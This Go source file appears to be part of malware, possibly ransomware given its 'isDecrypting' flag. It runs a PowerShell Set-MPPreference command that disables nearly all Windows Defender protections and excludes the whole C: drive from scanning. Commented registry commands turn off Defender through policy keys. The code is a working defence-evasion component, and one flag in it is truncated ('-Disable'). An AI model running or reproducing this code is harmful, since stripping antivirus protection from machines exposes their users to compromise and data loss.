package main

import (
	"fmt"
	"os/exec"
)

func handleDefenderExclusions(isDecrypting bool) {
	// Must be admin
	// Set-MPPreference -DisableIOAVProtection $true
	// Set-MPPreference -DisableRealtimeMonitoring $true
	// Set-MPPreference -DisableBehaviorMonitoring $true
	// Set-MPPreference -DisableIntrusionPreventionSystem $true
	// Set-MPPreference -DisableNetworkProtection $true
	disableScript := "Set-MPPreference -DisableIOAVProtection 1 -DisableRealtimeMonitoring 1 -DisableBehaviorMonitoring 1" +
		" -DisableIntrusionPreventionSystem 1 -DisableNetworkProtection 1 -DisableScriptScanning 1 -DisableArchiveScanning 1" +
		" -DisableEmailScanning 1 -DisableRemovableDriveScanning 1 -DisableNetworkProtection 1 -DisableCloudProtection 1" +
		" -DisableAutoSampleSubmission 1 -DisableRealtimeMonitoring 1 -DisableScanningMappedNetworkDrivesForFullScan 1 " +
		"-DisableScanningNetworkFiles 1 -Disable" +
		" -ExclusionPath 'C:\\*'"
	if !isDecrypting {
		err := runPowerShell(disableScript)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error disabling Defender: %s", err.Error()), ERROR)
		}
	}
}

func disableDefenderRegistry() {
	// reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
	// reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
	// reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
	// reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
	// reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
}

func runPowerShell(script string) error {
	fmt.Println("Running PowerShell script:", script)
	cmd := exec.Command("powershell", "-Command", script)
	err := cmd.Run()
	if err != nil {
		return err
	}
	return nil
}
